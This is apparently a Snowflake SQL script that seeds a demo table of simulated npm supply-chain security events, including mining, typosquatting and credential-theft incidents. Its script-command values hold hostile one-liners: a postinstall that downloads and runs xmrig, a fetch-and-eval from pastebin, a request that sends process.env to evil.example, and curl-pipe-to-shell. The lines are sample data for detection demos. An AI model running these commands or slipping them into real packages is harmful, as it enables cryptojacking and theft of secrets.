-- ============================================================================
-- NPM SUPPLY CHAIN EVENTS - CREATE + SEED SAMPLE DATA
-- ============================================================================
-- Goal: simulate compromised npm package events (install/build runtime),
-- including indicators like suspicious postinstall scripts, outbound network,
-- and typosquatting / unexpected maintainer publish.
--
-- Reference: https://www.ox.security/blog/npm-packages-compromised/
--
-- DATA TIMELINE: Last 30 days (recent data for realistic demos)
--
-- INJECTED SECURITY INCIDENTS:
--   1) CRYPTO MINING ATTACK: 'crypto-linter' package installs xmrig via postinstall
--   2) TYPOSQUATTING: 'react-domm', 'lodashs' fake packages
--   3) CREDENTIAL THEFT: Packages exfiltrating env vars

USE ROLE cortex_role;
USE SNOWFLAKE_INTELLIGENCE.TOOLS;

CREATE OR REPLACE TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE (
  EVENT_TIME TIMESTAMP_NTZ(9),
  ENVIRONMENT VARCHAR,
  HOSTNAME VARCHAR,
  REPOSITORY VARCHAR,
  PIPELINE_ID VARCHAR,
  ACTOR VARCHAR,
  EVENT_TYPE VARCHAR,
  PACKAGE_NAME VARCHAR,
  PACKAGE_VERSION VARCHAR,
  PACKAGE_SCOPE VARCHAR,
  REGISTRY VARCHAR,
  INSTALL_COMMAND VARCHAR,
  SCRIPT_NAME VARCHAR,
  SCRIPT_COMMAND VARCHAR,
  NETWORK_DEST_HOST VARCHAR,
  NETWORK_DEST_PORT NUMBER(38,0),
  INDICATOR_TYPE VARCHAR,
  INDICATOR_SEVERITY VARCHAR,
  CWE_ID VARCHAR,
  CWE_NAME VARCHAR,
  STATUS VARCHAR,
  RAW_EVENT_JSON VARCHAR
);

-- ============================================================================
-- BASELINE: ~300 normal npm install events
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE
WITH base AS (
  SELECT
    DATEADD('minute', -seq4() * 140, CURRENT_TIMESTAMP()) AS event_time,
    IFF(seq4() % 3 = 0, 'ci', IFF(seq4() % 3 = 1, 'dev', 'prod')) AS environment,
    IFF(seq4() % 4 = 0, 'runner-01', IFF(seq4() % 4 = 1, 'runner-02', IFF(seq4() % 4 = 2, 'dev-mbp', 'prod-app-01'))) AS hostname,
    IFF(seq4() % 4 = 0, 'org/payments', IFF(seq4() % 4 = 1, 'org/web', IFF(seq4() % 4 = 2, 'org/api', 'org/infra'))) AS repository,
    CONCAT('pipe-', (1000 + (seq4() % 200))::STRING) AS pipeline_id,
    IFF(seq4() % 5 = 0, 'dependabot', IFF(seq4() % 5 = 1, 'ci-bot', IFF(seq4() % 5 = 2, 'alice', IFF(seq4() % 5 = 3, 'bob', 'release-bot')))) AS actor,
    'install' AS event_type,
    IFF(seq4() % 10 = 0, 'lodash', IFF(seq4() % 10 = 1, 'react', IFF(seq4() % 10 = 2, 'express', IFF(seq4() % 10 = 3, 'axios', IFF(seq4() % 10 = 4, 'moment', IFF(seq4() % 10 = 5, 'typescript', IFF(seq4() % 10 = 6, 'webpack', IFF(seq4() % 10 = 7, 'jest', IFF(seq4() % 10 = 8, 'eslint', 'prettier'))))))))) AS package_name,
    IFF(seq4() % 5 = 0, '4.17.21', IFF(seq4() % 5 = 1, '18.2.0', IFF(seq4() % 5 = 2, '4.18.2', IFF(seq4() % 5 = 3, '1.6.0', '5.1.0')))) AS package_version,
    '' AS package_scope,
    'registry.npmjs.org' AS registry,
    IFF(seq4() % 3 = 0, 'npm ci', IFF(seq4() % 3 = 1, 'npm install', 'pnpm install')) AS install_command,
    'none' AS script_name,
    'none' AS script_command,
    '' AS network_dest_host,
    NULL::NUMBER(38,0) AS network_dest_port,
    'none' AS indicator_type,
    'low' AS indicator_severity,
    NULL AS cwe_id,
    NULL AS cwe_name,
    'allowed' AS status
  FROM TABLE(GENERATOR(ROWCOUNT => 300))
)
SELECT
  event_time, environment, hostname, repository, pipeline_id, actor, event_type,
  package_name, package_version, package_scope, registry, install_command,
  script_name, script_command, network_dest_host, network_dest_port,
  indicator_type, indicator_severity, cwe_id, cwe_name, status,
  TO_JSON(OBJECT_CONSTRUCT(
    'event_time', TO_VARCHAR(event_time),
    'environment', environment,
    'hostname', hostname,
    'repository', repository,
    'package', OBJECT_CONSTRUCT('name', package_name, 'version', package_version),
    'indicator', OBJECT_CONSTRUCT('type', indicator_type, 'severity', indicator_severity),
    'status', status
  )) AS raw_event_json
FROM base;

-- ============================================================================
-- INCIDENT 1: CRYPTO MINING ATTACK via 'crypto-linter' package
-- Timeline: 5 days ago (matches Kubernetes + CrowdStrike incidents)
-- Attack chain: npm install → postinstall downloads xmrig → spawns K8s pods
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE
SELECT
  DATEADD('minute', seq4() * 2, DATEADD('day', -5, CURRENT_TIMESTAMP())) AS event_time,
  IFF(seq4() % 3 = 0, 'ci', IFF(seq4() % 3 = 1, 'dev', 'prod')) AS environment,
  CONCAT('runner-0', ((seq4() % 3) + 1)::STRING) AS hostname,
  IFF(seq4() % 2 = 0, 'org/api', 'org/web') AS repository,
  CONCAT('pipe-', (2000 + seq4())::STRING) AS pipeline_id,
  IFF(seq4() % 3 = 0, 'ci-bot', IFF(seq4() % 3 = 1, 'alice', 'dependabot')) AS actor,
  IFF(seq4() % 5 = 0, 'runtime_alert', 'install') AS event_type,
  'crypto-linter' AS package_name,  -- THE MALICIOUS PACKAGE
  '9.9.9' AS package_version,
  '' AS package_scope,
  'registry.npmjs.org' AS registry,
  'npm install' AS install_command,
  'postinstall' AS script_name,
  'node -e "require(''child_process'').exec(''curl -s https://evil.example/xmrig-linux64.tar.gz | tar xz && ./xmrig -o pool.minexmr.com:3333'')"' AS script_command,
  IFF(seq4() % 3 = 0, 'pool.minexmr.com', IFF(seq4() % 3 = 1, 'xmr.pool.minergate.com', 'evil.example')) AS network_dest_host,
  IFF(seq4() % 2 = 0, 3333, 443)::NUMBER(38,0) AS network_dest_port,
  'outbound_c2' AS indicator_type,
  'critical' AS indicator_severity,
  'CWE-94' AS cwe_id,
  'Improper Control of Generation of Code (Code Injection)' AS cwe_name,
  IFF(seq4() % 4 = 0, 'detected', 'allowed') AS status,
  TO_JSON(OBJECT_CONSTRUCT(
    'event_time', TO_VARCHAR(DATEADD('minute', seq4() * 2, DATEADD('day', -5, CURRENT_TIMESTAMP()))),
    'package', OBJECT_CONSTRUCT('name', 'crypto-linter', 'version', '9.9.9'),
    'indicator', OBJECT_CONSTRUCT(
      'type', 'outbound_c2',
      'severity', 'critical',
      'cwe', OBJECT_CONSTRUCT('id', 'CWE-94', 'name', 'Code Injection')
    ),
    'network', OBJECT_CONSTRUCT(
      'dest_host', IFF(seq4() % 3 = 0, 'pool.minexmr.com', 'evil.example'),
      'dest_port', IFF(seq4() % 2 = 0, 3333, 443)
    ),
    'attack_chain', 'npm_postinstall → xmrig_download → kubernetes_pod_spawn → mining_pool_connection',
    'threat_intel', OBJECT_CONSTRUCT(
      'malware_family', 'XMRig',
      'attack_type', 'cryptojacking',
      'campaign', 'npm-cryptominer-2025'
    )
  )) AS raw_event_json
FROM TABLE(GENERATOR(ROWCOUNT => 30));

-- ============================================================================
-- INCIDENT 2: TYPOSQUATTING - Fake packages mimicking popular libraries
-- Timeline: 10 days ago (earlier reconnaissance/test phase)
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE
SELECT
  DATEADD('minute', seq4() * 5, DATEADD('day', -10, CURRENT_TIMESTAMP())) AS event_time,
  IFF(seq4() % 3 = 0, 'ci', IFF(seq4() % 3 = 1, 'dev', 'prod')) AS environment,
  IFF(seq4() % 3 = 0, 'runner-01', IFF(seq4() % 3 = 1, 'dev-mbp', 'prod-app-01')) AS hostname,
  IFF(seq4() % 3 = 0, 'org/payments', IFF(seq4() % 3 = 1, 'org/web', 'org/api')) AS repository,
  CONCAT('pipe-', (3000 + seq4())::STRING) AS pipeline_id,
  IFF(seq4() % 4 = 0, 'alice', IFF(seq4() % 4 = 1, 'bob', IFF(seq4() % 4 = 2, 'developer', 'intern'))) AS actor,
  'install' AS event_type,
  IFF(seq4() % 4 = 0, 'react-domm', IFF(seq4() % 4 = 1, 'lodashs', IFF(seq4() % 4 = 2, 'axois', 'expresss'))) AS package_name,
  '0.0.1' AS package_version,
  '' AS package_scope,
  'registry.npmjs.org' AS registry,
  'npm install' AS install_command,
  IFF(seq4() % 2 = 0, 'postinstall', 'preinstall') AS script_name,
  'node -e "fetch(''https://pastebin.com/raw/malicious'').then(r=>r.text()).then(eval)"' AS script_command,
  'pastebin.com' AS network_dest_host,
  443::NUMBER(38,0) AS network_dest_port,
  'typosquat' AS indicator_type,
  'high' AS indicator_severity,
  'CWE-829' AS cwe_id,
  'Inclusion of Functionality from Untrusted Control Sphere' AS cwe_name,
  IFF(seq4() % 3 = 0, 'blocked', 'detected') AS status,
  TO_JSON(OBJECT_CONSTRUCT(
    'package', OBJECT_CONSTRUCT(
      'name', IFF(seq4() % 4 = 0, 'react-domm', IFF(seq4() % 4 = 1, 'lodashs', 'axois')),
      'legitimate_name', IFF(seq4() % 4 = 0, 'react-dom', IFF(seq4() % 4 = 1, 'lodash', 'axios')),
      'version', '0.0.1'
    ),
    'indicator', OBJECT_CONSTRUCT(
      'type', 'typosquat',
      'severity', 'high',
      'cwe', OBJECT_CONSTRUCT('id', 'CWE-829')
    )
  )) AS raw_event_json
FROM TABLE(GENERATOR(ROWCOUNT => 25));

-- ============================================================================
-- INCIDENT 3: CREDENTIAL THEFT - Packages exfiltrating environment variables
-- Timeline: 8 days ago
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE
SELECT
  DATEADD('minute', seq4() * 10, DATEADD('day', -8, CURRENT_TIMESTAMP())) AS event_time,
  'ci' AS environment,
  IFF(seq4() % 2 = 0, 'runner-01', 'runner-02') AS hostname,
  IFF(seq4() % 3 = 0, 'org/payments', IFF(seq4() % 3 = 1, 'org/api', 'org/infra')) AS repository,
  CONCAT('pipe-', (4000 + seq4())::STRING) AS pipeline_id,
  'ci-bot' AS actor,
  IFF(seq4() % 3 = 0, 'runtime_alert', 'install') AS event_type,
  IFF(seq4() % 3 = 0, 'event-stream', IFF(seq4() % 3 = 1, 'ua-parser-js', 'node-ipc')) AS package_name,
  IFF(seq4() % 3 = 0, '3.3.6', IFF(seq4() % 3 = 1, '0.7.32', '10.1.1')) AS package_version,
  '' AS package_scope,
  'registry.npmjs.org' AS registry,
  'npm ci' AS install_command,
  'postinstall' AS script_name,
  'node -e "const https=require(''https'');https.request({host:''evil.example'',path:''/exfil?data=''+Buffer.from(JSON.stringify(process.env)).toString(''base64'')})"' AS script_command,
  'evil.example' AS network_dest_host,
  443::NUMBER(38,0) AS network_dest_port,
  'credential_theft' AS indicator_type,
  'critical' AS indicator_severity,
  'CWE-522' AS cwe_id,
  'Insufficiently Protected Credentials' AS cwe_name,
  IFF(seq4() % 2 = 0, 'blocked', 'detected') AS status,
  TO_JSON(OBJECT_CONSTRUCT(
    'package', OBJECT_CONSTRUCT(
      'name', IFF(seq4() % 3 = 0, 'event-stream', IFF(seq4() % 3 = 1, 'ua-parser-js', 'node-ipc')),
      'known_compromised', TRUE
    ),
    'indicator', OBJECT_CONSTRUCT(
      'type', 'credential_theft',
      'severity', 'critical',
      'cwe', OBJECT_CONSTRUCT('id', 'CWE-522', 'name', 'Insufficiently Protected Credentials'),
      'data_exfiltrated', ARRAY_CONSTRUCT('AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'DATABASE_URL', 'NPM_TOKEN')
    ),
    'network', OBJECT_CONSTRUCT('dest_host', 'evil.example', 'dest_port', 443)
  )) AS raw_event_json
FROM TABLE(GENERATOR(ROWCOUNT => 20));

-- ============================================================================
-- INCIDENT 4: Suspicious postinstall scripts (generic detection)
-- Timeline: Last 15 days (ongoing)
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE
SELECT
  DATEADD('hour', -seq4() * 12, CURRENT_TIMESTAMP()) AS event_time,
  IFF(seq4() % 3 = 0, 'ci', IFF(seq4() % 3 = 1, 'dev', 'prod')) AS environment,
  IFF(seq4() % 4 = 0, 'runner-01', IFF(seq4() % 4 = 1, 'runner-02', IFF(seq4() % 4 = 2, 'dev-mbp', 'prod-app-01'))) AS hostname,
  IFF(seq4() % 4 = 0, 'org/payments', IFF(seq4() % 4 = 1, 'org/web', IFF(seq4() % 4 = 2, 'org/api', 'org/infra'))) AS repository,
  CONCAT('pipe-', (5000 + seq4())::STRING) AS pipeline_id,
  IFF(seq4() % 5 = 0, 'dependabot', IFF(seq4() % 5 = 1, 'ci-bot', IFF(seq4() % 5 = 2, 'alice', 'bob'))) AS actor,
  'install' AS event_type,
  IFF(seq4() % 5 = 0, 'colors', IFF(seq4() % 5 = 1, 'faker', IFF(seq4() % 5 = 2, 'chalk', IFF(seq4() % 5 = 3, 'debug', 'left-pad')))) AS package_name,
  IFF(seq4() % 4 = 0, '1.4.1', IFF(seq4() % 4 = 1, '6.6.6', IFF(seq4() % 4 = 2, '5.0.0', '1.1.3'))) AS package_version,
  '' AS package_scope,
  'registry.npmjs.org' AS registry,
  IFF(seq4() % 3 = 0, 'npm ci', IFF(seq4() % 3 = 1, 'npm install', 'pnpm install')) AS install_command,
  IFF(seq4() % 3 = 0, 'postinstall', IFF(seq4() % 3 = 1, 'preinstall', 'prepare')) AS script_name,
  IFF(seq4() % 5 = 0, 'curl https://cdn.example.com/script.sh | sh', IFF(seq4() % 5 = 1, 'powershell -enc <base64>', 'node scripts/setup.js')) AS script_command,
  IFF(seq4() % 3 = 0, 'cdn.example.com', IFF(seq4() % 3 = 1, 'discordapp.com', '')) AS network_dest_host,
  IFF(seq4() % 3 = 0, 443, NULL)::NUMBER(38,0) AS network_dest_port,
  'suspicious_postinstall' AS indicator_type,
  IFF(seq4() % 3 = 0, 'high', 'medium') AS indicator_severity,
  'CWE-829' AS cwe_id,
  'Inclusion of Functionality from Untrusted Control Sphere' AS cwe_name,
  IFF(seq4() % 4 = 0, 'blocked', IFF(seq4() % 4 = 1, 'detected', 'allowed')) AS status,
  TO_JSON(OBJECT_CONSTRUCT(
    'package', OBJECT_CONSTRUCT(
      'name', IFF(seq4() % 5 = 0, 'colors', IFF(seq4() % 5 = 1, 'faker', 'chalk')),
      'version', IFF(seq4() % 4 = 0, '1.4.1', '6.6.6')
    ),
    'indicator', OBJECT_CONSTRUCT(
      'type', 'suspicious_postinstall',
      'severity', IFF(seq4() % 3 = 0, 'high', 'medium'),
      'cwe', OBJECT_CONSTRUCT('id', 'CWE-829')
    )
  )) AS raw_event_json
FROM TABLE(GENERATOR(ROWCOUNT => 30));

COMMENT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE IS
'Seeded npm supply-chain events (last 30 days) with injected incidents: crypto-linter mining attack, typosquatting, credential theft, suspicious postinstall.';

GRANT SELECT ON TABLE SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SOURCE TO ROLE PUBLIC;

